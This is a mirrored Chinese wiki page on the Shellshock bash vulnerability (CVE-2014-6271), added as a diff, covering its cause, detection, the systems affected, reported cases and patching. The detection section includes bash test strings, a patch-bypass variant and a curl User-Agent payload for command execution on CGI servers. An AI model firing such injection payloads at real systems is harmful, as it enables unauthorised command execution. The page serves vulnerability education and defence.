@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="zh" dir="ltr">
+
+<!-- Mirrored from wiki.wooyun.org/_export/xhtml/server:bash by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Dec 2015 03:03:05 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+  <meta charset="utf-8" />
+  <title>server:bash</title>
+<meta name="generator" content="DokuWiki"/>
+<meta name="robots" content="index,follow"/>
+<meta name="keywords" content="server,bash"/>
+<link rel="search" type="application/opensearchdescription+xml" href="../../lib/exe/opensearch.php" title="WooYun WiKi"/>
+<link rel="start" href="../../index.html"/>
+<link rel="contents" href="../../server_bashdecf.html?do=index" title="网站地图"/>
+<link rel="alternate" type="application/rss+xml" title="最近更改" href="../../feed.php"/>
+<link rel="alternate" type="application/rss+xml" title="当前命名空间" href="../../feed0688.php?mode=list&amp;ns=server"/>
+<link rel="alternate" type="text/html" title="纯HTML" href="server_bash.html"/>
+<link rel="alternate" type="text/plain" title="Wiki Markup 语言" href="../raw/bash.txt"/>
+<link rel="canonical" href="../../server_bash.html"/>
+<link rel="stylesheet" type="text/css" href="../../lib/exe/css70b4.css?t=bootstrap3&amp;tseed=6dcbf66232c3759c28d0e8f6d9cdfd22"/>
+<script type="text/javascript">/*<![CDATA[*/var NS='server';var JSINFO = {"id":"server:bash","namespace":"server","plugin_codeprettify":{"loader_base":"\/lib\/plugins\/codeprettify\/google-code-prettify"}};
+/*!]]>*/</script>
+<script type="text/javascript" charset="utf-8" src="../../lib/exe/js1e16.php?tseed=6dcbf66232c3759c28d0e8f6d9cdfd22"></script>
+<script type="text/javascript" charset="utf-8" src="../../lib/plugins/codeprettify/google-code-prettify/run_prettifyeb11.js?lang=css"></script>
+</head>
+<body>
+<div class="dokuwiki export">
+<!-- TOC START -->
+<div id="dw__toc">
+<h3 class="toggle">目录</h3>
+<div>
+
+<ul class="toc">
+<li class="level1"><div class="li"><a href="#bash漏洞_shellshock">bash漏洞（shellshock）</a></div>
+<ul class="toc">
+<li class="clear">
+<ul class="toc">
+<li class="level3"><div class="li"><a href="#漏洞简介">1、漏洞简介</a></div></li>
+<li class="level3"><div class="li"><a href="#漏洞成因">2、漏洞成因</a></div></li>
+<li class="level3"><div class="li"><a href="#漏洞检测及利用">3、漏洞检测及利用</a></div></li>
+<li class="level3"><div class="li"><a href="#影响范围">4、影响范围</a></div></li>
+<li class="level3"><div class="li"><a href="#实际案例">5、实际案例</a></div></li>
+<li class="level3"><div class="li"><a href="#漏洞修复">6、漏洞修复</a></div></li>
+<li class="level3"><div class="li"><a href="#相关资源">7、相关资源</a></div></li>
+</ul></li>
+</ul></li>
+</ul>
+</div>
+</div>
+<!-- TOC END -->
+
+<h1 class="sectionedit1" id="bash漏洞_shellshock">bash漏洞（shellshock）</h1>
+<div class="level1">
+
+</div>
+<!-- EDIT1 SECTION "bash漏洞（shellshock）" [1-42] -->
+<h3 class="sectionedit2" id="漏洞简介">1、漏洞简介</h3>
+<div class="level3">
+<hr />
+
+<p>
+CVE-2014-6271漏洞又称破壳漏洞，是Stéphane Chazelas（法国）于2014年9月中旬发现的SHELL的一个漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行shell命令。该漏洞影响极其严重，修复过程也十分坎坷。时间线大致如下：
+</p>
+
+<p>
+9月24日：CVE-2014-6271被公开，补丁也快速形成，但因补丁修复不完整导致CVE-2014-7169；
+</p>
+
+<p>
+9月27日：因前两个漏洞补丁修复不完整导致CVE-2014-6277；
+</p>
+
+<p>
+9月30日：因在前三个漏洞补丁修复不完整导致CVE-2014-6278；
+</p>
+
+<p>
+9月28日：Bash的两个溢出漏洞又被公开CVE-2014-7186、CVE-2014-7187。
+</p>
+
+</div>
+<!-- EDIT2 SECTION "1、漏洞简介" [43-799] -->
+<h3 class="sectionedit3" id="漏洞成因">2、漏洞成因</h3>
+<div class="level3">
+<hr />
+
+<p>
+存在漏洞的bash会将形如
+</p>
+<pre class="code bash"><span class="co4">$ </span><span class="kw2">env</span> <span class="re2">x</span>=<span class="st_h">'() { :;}; echo vulnerable'</span> <span class="kw2">bash</span> <span class="re5">-c</span> <span class="st0">&quot;echo this is a test&quot;</span></pre>
+
+<p>
+的字符解析为一个函数定义和一个command。导致任意命令执行。
+</p>
+
+</div>
+<!-- EDIT3 SECTION "2、漏洞成因" [800-1029] -->
+<h3 class="sectionedit4" id="漏洞检测及利用">3、漏洞检测及利用</h3>
+<div class="level3">
+<hr />
+
+<p>
+bash破壳漏洞本地检测
+官方验证版 
+</p>
+<pre class="code bash"><span class="kw2">env</span> <span class="re2">x</span>=<span class="st_h">'() { :;}; echo vulnerable; bash -c &quot;echo this is a test&quot;</span></pre>
+
+<p>
+若系统bash存在漏洞则会打印出
+</p>
+<pre class="code">vulnerable
+this is a test</pre>
+
+<p>
+官方patch绕过版
+</p>
+<pre class="code bash"><span class="kw2">env</span> <span class="re5">-i</span> <span class="re2">X</span>=<span class="st_h">'() { (a)=&gt;\'</span> <span class="kw2">bash</span> <span class="re5">-c</span> <span class="st_h">'echo date'</span>; <span class="kw2">cat</span> <span class="kw3">echo</span></pre>
+
+<p>
+http cgi远程命令执行
+</p>
+<pre class="code bash">curl <span class="re5">-A</span> <span class="st0">&quot;() { :; }; /bin/ls /; uname -a&quot;</span> http:<span class="sy0">//</span>www.aaa.com<span class="sy0">/</span>bbb.cgi <span class="re5">-v</span></pre>
+
+</div>
+<!-- EDIT4 SECTION "3、漏洞检测及利用" [1030-1490] -->
+<h3 class="sectionedit5" id="影响范围">4、影响范围</h3>
+<div class="level3">
+<hr />
+
+<p>
+“破壳”是一个严重漏洞的别名，在Red Hat、CentOS、Ubuntu 、Fedora 、Amazon Linux 、OS X 10.10中均拥有存在CVE-2014-6271（即“破壳”漏洞）漏洞的Bash版本，同时由于Bash在各主流操作系统的广泛应用，此漏洞的影响范围包括但不限于大多数应用Bash的Unix、Linux、Mac <abbr title="Operating System">OS</abbr> X，而针对这些操作系统管理下的数据均存在高危威胁。
+</p>
+
+<p>
+此漏洞可能会影响到使用ForceCommand功能的OpenSSH sshd、使用mod<em>cgi或mod</em>cgid的Apache服务器、DHCP客户端、SMTP服务器等其他使用bash作为解释器的应用。
+</p>
+
+</div>
+<!-- EDIT5 SECTION "4、影响范围" [1491-2125] -->
+<h3 class="sectionedit6" id="实际案例">5、实际案例</h3>
+<div class="level3">
+<hr />
+
+<p>
+<a href="http://www.wooyun.org/bugs/wooyun-2010-078387" class="urlextern" title="http://www.wooyun.org/bugs/wooyun-2010-078387"  rel="nofollow">中国医学科学院病原生物学研究所官网存在破壳漏洞</a>
+</p>
+
+<p>
+<a href="http://www.wooyun.org/bugs/wooyun-2010-078029" class="urlextern" title="http://www.wooyun.org/bugs/wooyun-2010-078029"  rel="nofollow">华中农业大学-生物信息学中心-下某实验室网站存在破壳漏洞</a>
+</p>
+
+<p>
+<a href="http://www.wooyun.org/bugs/wooyun-2010-077300" class="urlextern" title="http://www.wooyun.org/bugs/wooyun-2010-077300"  rel="nofollow">CSDN某业务Bash（CVE-2014-6271）漏洞导致系统可被入侵</a>
+</p>
+
+</div>
+<!-- EDIT6 SECTION "5、实际案例" [2126-2528] -->
+<h3 class="sectionedit7" id="漏洞修复">6、漏洞修复</h3>
+<div class="level3">
+<hr />
+
+<p>
+安装最新的补丁
+</p>
+
+<p>
+在各种GNU/Linux发行版里需要升级：
+</p>
+
+<p>
+Debian-based（包括Ubuntu）:
+</p>
+<pre class="code bash"><span class="kw2">sudo</span> <span class="kw2">apt-get update</span> <span class="sy0">&amp;&amp;</span> <span class="kw2">apt-get upgrade</span></pre>
+
+<p>
+Gentoo：
+</p>
+<pre class="code">sudo emerge --sync &amp;&amp; glsa-check -f affected</pre>
+
+<p>
+OpenSSH:
+</p>
+<pre class="code">加入no-pty</pre>
+
+</div>
+<!-- EDIT7 SECTION "6、漏洞修复" [2529-2827] -->
+<h3 class="sectionedit8" id="相关资源">7、相关资源</h3>
+<div class="level3">
+<hr />
+
+<p>
+<a href="http://www.freebuf.com/articles/web/45520.html" class="urlextern" title="http://www.freebuf.com/articles/web/45520.html"  rel="nofollow">从语法解析角度分析Bash破壳漏洞</a>
+</p>
+
+<p>
+<a href="http://www.freebuf.com/news/48331.html" class="urlextern" title="http://www.freebuf.com/news/48331.html"  rel="nofollow">破壳漏洞（CVE-2014-6271）综合分析：“破壳”漏洞系列分析之一</a>
+</p>
+
+<p>
+<a href="http://www.freebuf.com/articles/system/48357.html" class="urlextern" title="http://www.freebuf.com/articles/system/48357.html"  rel="nofollow">破壳漏洞（CVE-2014-6271）综合分析：“破壳”漏洞系列分析之二</a>
+</p>
+
+<p>
+<a href="http://www.freebuf.com/articles/system/48406.html" class="urlextern" title="http://www.freebuf.com/articles/system/48406.html"  rel="nofollow">破壳漏洞（CVE-2014-6271）综合分析：“破壳”漏洞系列分析之三</a>
+</p>
+
+<p>
+<a href="http://www.freebuf.com/news/49292.html" class="urlextern" title="http://www.freebuf.com/news/49292.html"  rel="nofollow">Bash破壳漏洞（ShellShock）再变身：针对邮件服务器SMTP攻击</a>
+</p>
+
+<p>
+<a href="http://www.freebuf.com/articles/system/50065.html" class="urlextern" title="http://www.freebuf.com/articles/system/50065.html"  rel="nofollow">安全科普：让高大上的Bash破壳漏洞不再难理解（上）</a>
+</p>
+
+<p>
+<a href="http://www.freebuf.com/articles/system/50707.html" class="urlextern" title="http://www.freebuf.com/articles/system/50707.html"  rel="nofollow">安全科普：让高大上的Bash破壳漏洞不再难理解（下）</a>
+</p>
+
+<p>
+<a href="http://drops.wooyun.org/papers/3064" class="urlextern" title="http://drops.wooyun.org/papers/3064"  rel="nofollow">CVE-2014-6271资料汇总</a>
+</p>
+
+<p>
+<a href="http://drops.wooyun.org/papers/3268" class="urlextern" title="http://drops.wooyun.org/papers/3268"  rel="nofollow">Shellshock漏洞回顾与分析测试</a>
+</p>
+
+</div>
+<!-- EDIT8 SECTION "7、相关资源" [2828-] --></div>
+</body>
+
+<!-- Mirrored from wiki.wooyun.org/_export/xhtml/server:bash by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 04 Dec 2015 03:03:05 GMT -->
+</html>
